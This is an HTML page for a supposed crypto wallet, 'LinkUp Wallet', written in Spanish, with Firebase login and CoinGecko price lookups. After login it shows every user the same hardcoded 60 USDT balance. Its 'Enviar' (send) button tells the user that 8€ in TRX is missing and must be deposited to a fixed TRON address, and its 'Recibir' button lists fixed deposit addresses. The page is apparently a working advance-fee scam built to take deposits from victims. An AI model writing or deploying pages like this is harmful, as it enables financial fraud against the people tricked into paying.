<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>LinkUp Wallet</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #0d0d0d;
      color: white;
    }
    .container {
      max-width: 400px;
      margin: auto;
      padding: 20px;
      text-align: center;
    }
    .auth, .wallet {
      display: none;
    }
    h1 {
      font-size: 28px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
    }
    button {
      padding: 10px 15px;
      margin: 5px;
      border: none;
      border-radius: 8px;
      background-color: #1a1a1a;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }
    .balance {
      font-size: 36px;
      margin-top: 20px;
    }
    .change {
      color: #00ff9d;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .buttons {
      display: flex;
      justify-content: space-around;
      margin-bottom: 20px;
    }
    .crypto-list {
      text-align: left;
    }
    .crypto-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px;
      border-bottom: 1px solid #222;
    }
    .crypto-item img {
      width: 24px;
      margin-right: 10px;
    }
    .label {
      display: flex;
      align-items: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="auth" id="auth">
      <h1>Bienvenido a LinkUp</h1>
      <input type="email" id="email" placeholder="Correo electrónico" />
      <input type="password" id="password" placeholder="Contraseña" />
      <button id="register">Registrarse</button>
      <button id="login">Iniciar sesión</button>
    </div>

    <div class="wallet" id="wallet">
      <h1>LinkUp Wallet</h1>
      <div class="balance" id="balance">60 USDT</div>
      <div class="change" id="change">+0.10 € (0.2%) en 24h</div>
      <div class="buttons">
        <button onclick="receive()">Recibir</button>
        <button onclick="send()">Enviar</button>
        <button id="logout">Cerrar sesión</button>
      </div>
      <div class="crypto-list" id="crypto-list">
        <div class="crypto-item">
          <div class="label"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" /> USDT</div>
          <div id="usdt-price">60 USDT</div>
        </div>
        <div class="crypto-item">
          <div class="label"><img src="https://cryptologos.cc/logos/tron-trx-logo.png" /> TRX</div>
          <div id="trx-price">≈</div>
        </div>
        <div class="crypto-item">
          <div class="label"><img src="https://cryptologos.cc/logos/solana-sol-logo.png" /> SOL</div>
          <div id="sol-price">0 SOL</div>
        </div>
        <div class="crypto-item">
          <div class="label"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" /> BTC</div>
          <div id="btc-price">0 BTC</div>
        </div>
        <div class="crypto-item">
          <div class="label"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" /> ETH</div>
          <div id="eth-price">0 ETH</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
    import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js';

    const firebaseConfig = {
      apiKey: "AIzaSyC9_hbiDnFxgx41m5cWuroigWv0LdWdlrs",
      authDomain: "linkup-11438.firebaseapp.com",
      projectId: "linkup-11438",
      storageBucket: "linkup-11438.appspot.com",
      messagingSenderId: "183432635859",
      appId: "1:183432635859:web:6cd6d6eabf273667313b26",
      measurementId: "G-V3RHF76ZG6"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);

    const authDiv = document.getElementById('auth');
    const walletDiv = document.getElementById('wallet');

    document.getElementById('register').onclick = () => {
      const email = document.getElementById('email').value;
      const pass = document.getElementById('password').value;
      createUserWithEmailAndPassword(auth, email, pass)
        .catch(e => alert(e.message));
    };

    document.getElementById('login').onclick = () => {
      const email = document.getElementById('email').value;
      const pass = document.getElementById('password').value;
      signInWithEmailAndPassword(auth, email, pass)
        .catch(e => alert(e.message));
    };

    document.getElementById('logout').onclick = () => {
      signOut(auth);
    };

    onAuthStateChanged(auth, (user) => {
      if (user) {
        authDiv.style.display = 'none';
        walletDiv.style.display = 'block';
        fetchPrices();
      } else {
        authDiv.style.display = 'block';
        walletDiv.style.display = 'none';
      }
    });

    function fetchPrices() {
      fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether,tron,solana,bitcoin,ethereum&vs_currencies=eur&include_24hr_change=true")
        .then(res => res.json())
        .then(data => {
          document.getElementById("trx-price").textContent = `≈ ${(60 / data.tron.eur).toFixed(2)} TRX`;
          document.getElementById("sol-price").textContent = `≈ ${(60 / data.solana.eur).toFixed(4)} SOL`;
          document.getElementById("btc-price").textContent = `≈ ${(60 / data.bitcoin.eur).toFixed(6)} BTC`;
          document.getElementById("eth-price").textContent = `≈ ${(60 / data.ethereum.eur).toFixed(5)} ETH`;

          const change = data.tether.eur_24h_change;
          document.getElementById("change").textContent = `${change > 0 ? '+' : ''}${(change * 0.6).toFixed(2)} € (${change.toFixed(2)}%) en 24h`;
        });
    }

    window.receive = () => {
      alert("Direcciones:\nUSDT TRX: TMacSeNh7ZzuMTXgNccQbBD3wewyYSYSjn\nSolana: 65yX9MGe62PXhNrgPFo7u3RqpyZjmDmF3r8k1HGAGfM4");
    };

    window.send = () => {
      fetch("https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=eur")
        .then(res => res.json())
        .then(data => {
          const tronPrice = data.tron.eur;
          const missing = 8;
          const neededTRX = (missing / tronPrice).toFixed(2);
          alert(`Tienes 60 USDT.\nFaltan 8€ en TRX.\nEquivale a ${neededTRX} TRX.\nDeposita en: TKNBhiB4j8N6cm3hJ1VycdcQ4GiyrXuZmE`);
        });
    }
  </script>
</body>
</html>
